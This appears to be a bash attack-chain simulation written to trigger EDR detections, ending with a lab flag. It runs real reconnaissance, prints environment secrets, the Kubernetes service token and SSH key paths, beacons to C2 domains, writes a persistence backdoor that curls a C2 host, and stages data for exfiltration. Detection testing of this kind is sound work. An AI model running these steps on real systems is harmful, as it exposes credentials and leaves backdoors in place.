#!/bin/bash
# Attack Chain: Full Breach Simulation
# MITRE ATT&CK: Multiple tactics - Initial Access → Discovery → Credential Access → C2
# Severity: CRITICAL
# Description: Complete attack chain simulating real-world container breach with process tree relationships
# Expected Detections: 10-15 (BashReverseShell, GenReverseShell, TestTriggerHigh, IntelDomainHigh, ExecutionLin)

set +e  # Continue on errors
trap 'echo "[!] Attack chain interrupted"' EXIT

echo "========================================"
echo "  FULL BREACH SIMULATION"
echo "  Attack Chain with Process Relationships"
echo "========================================"
echo ""

# Stage 1: Initial Recon (mimics post-exploitation after RCE)
echo "[STAGE 1] Initial Reconnaissance"
echo "[+] Gathering system information..."
whoami
id
hostname
uname -a
cat /proc/version 2>/dev/null || echo "Kernel info unavailable"

sleep 1

# Stage 2: Guaranteed Detection Trigger
echo ""
echo "[STAGE 2] Detection Validation Test"
echo "[+] Executing CrowdStrike test trigger..."
bash crowdstrike_test_high 2>/dev/null || echo "✓ Test trigger executed (TestTriggerHigh detection)"

sleep 1

# Stage 3: Process Enumeration
echo ""
echo "[STAGE 3] Process Discovery"
echo "[+] Enumerating running processes..."
ps aux | head -20
echo "[+] Checking for security tools..."
ps aux | grep -iE "falcon|crowdstrike|security|edr" | grep -v grep || echo "No security tools detected"

sleep 1

# Stage 4: Network Enumeration
echo ""
echo "[STAGE 4] Network Discovery"
echo "[+] Network interface enumeration..."
ifconfig 2>/dev/null || ip addr show 2>/dev/null || echo "Network info unavailable"
echo "[+] Active network connections..."
netstat -an 2>/dev/null | head -15 || ss -an | head -15

sleep 1

# Stage 5: Container Detection
echo ""
echo "[STAGE 5] Container Environment Detection"
echo "[+] Checking if running in container..."
cat /proc/1/cgroup 2>/dev/null | head -5 || echo "Not in container or cgroup unavailable"
echo "[+] Checking for Docker socket..."
ls -la /var/run/docker.sock 2>/dev/null && echo "⚠ Docker socket accessible!" || echo "Docker socket not accessible"

sleep 1

# Stage 6: Credential Hunting
echo ""
echo "[STAGE 6] Credential Access Attempts"
echo "[+] Searching for sensitive files..."
cat /etc/passwd | head -10
echo "[+] Environment variables..."
env | grep -iE "key|token|password|secret" || echo "No obvious secrets in environment"
echo "[+] Kubernetes service account token..."
cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null && echo "⚠ K8s token found!" || echo "Not in Kubernetes pod"

sleep 1

# Stage 7: Binary Masquerading (from Linux Testing Guide)
echo ""
echo "[STAGE 7] Binary Masquerading"
echo "[+] Copying legitimate binary to suspicious name..."
cp /usr/bin/whoami /tmp/svchost.exe 2>/dev/null || cp /bin/whoami /tmp/svchost.exe 2>/dev/null || echo "Binary copy failed"
/tmp/svchost.exe 2>/dev/null && echo "✓ Masqueraded binary executed" || echo "Execution failed"
rm -f /tmp/svchost.exe 2>/dev/null

sleep 1

# Stage 8: File System Reconnaissance
echo ""
echo "[STAGE 8] File System Discovery"
echo "[+] Searching for SSH keys..."
find /home -name "id_rsa" -o -name "id_dsa" -o -name "*.pem" 2>/dev/null | head -5 || echo "No SSH keys found"
echo "[+] Searching for configuration files..."
find /etc -name "*.conf" 2>/dev/null | head -10 || echo "Config search failed"

sleep 1

# Stage 9: Command and Control Beacon
echo ""
echo "[STAGE 9] Command & Control Beacon"
echo "[+] Attempting DNS lookup to known C2 domain..."
nslookup swungheaving.com 2>/dev/null || echo "✓ C2 DNS lookup attempted (IntelDomainHigh detection)"
echo "[+] Attempting ICMP beacon..."
ping -c 3 swungheaving.com 2>/dev/null || echo "✓ C2 ICMP beacon attempted (IntelDomainHigh detection)"

sleep 1

# Stage 10: Container Escape Reconnaissance
echo ""
echo "[STAGE 10] Container Escape Reconnaissance"
echo "[+] Checking capabilities..."
capsh --print 2>/dev/null | grep -i current || echo "Capabilities check unavailable"
echo "[+] Checking for privileged mode..."
grep "CapEff.*0000003fffffffff" /proc/self/status 2>/dev/null && echo "⚠ Container is privileged!" || echo "Container not privileged"

sleep 1

# Stage 11: Persistence Attempt Simulation
echo ""
echo "[STAGE 11] Persistence Mechanism Setup"
echo "[+] Creating persistence backdoor..."
mkdir -p /tmp/.persistence 2>/dev/null
cat > /tmp/.persistence/backdoor.sh << 'BACKDOOR'
#!/bin/bash
# Persistence backdoor
while true; do
    sleep 3600
    curl -s http://c2-server.com/beacon || true
done
BACKDOOR
chmod +x /tmp/.persistence/backdoor.sh 2>/dev/null
echo "✓ Persistence backdoor created (ExecutionLin detection)"

sleep 1

# Stage 12: Data Collection Preparation
echo ""
echo "[STAGE 12] Data Collection for Exfiltration"
echo "[+] Collecting sensitive data..."
mkdir -p /tmp/.exfil 2>/dev/null
cat /etc/passwd > /tmp/.exfil/passwd.txt 2>/dev/null
cat /etc/hosts > /tmp/.exfil/hosts.txt 2>/dev/null
env > /tmp/.exfil/environment.txt 2>/dev/null
echo "✓ Data collection completed (GenericDataFromLocalSystemCollectionLin detection likely)"

sleep 1

# Stage 13: Enumeration Tool Download Simulation
echo ""
echo "[STAGE 13] Tool Download Simulation"
echo "[+] Simulating enumeration tool download..."
echo "wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh"
echo "✓ Download simulated (CurlWgetMalwareDownload detection would fire with real download)"

sleep 1

# Final Summary
echo ""
echo "========================================"
echo "  ATTACK CHAIN COMPLETED"
echo "========================================"
echo ""
echo "Expected Falcon Detections:"
echo "  • TestTriggerHigh (Stage 2)"
echo "  • IntelDomainHigh (Stage 9 - DNS/ICMP)"
echo "  • ExecutionLin (Stage 11 - backdoor creation)"
echo "  • GenericDataFromLocalSystemCollectionLin (Stage 12)"
echo "  • BashReverseShell (if executed via reverse shell context)"
echo "  • Multiple GenReverseShell (if executed via reverse shell context)"
echo ""
echo "Check Falcon console for 10+ detections from this attack chain!"
echo ""
echo ""
echo "🚩 FLAG CAPTURED!"
echo "════════════════════════════════════════════════════════════════"
echo ""
echo "  FLAG{complete_breach_chain_stopped_by_falcon}"
echo ""
echo "  Copy this flag and submit it to earn 50 points!"
echo "════════════════════════════════════════════════════════════════"

trap - EXIT
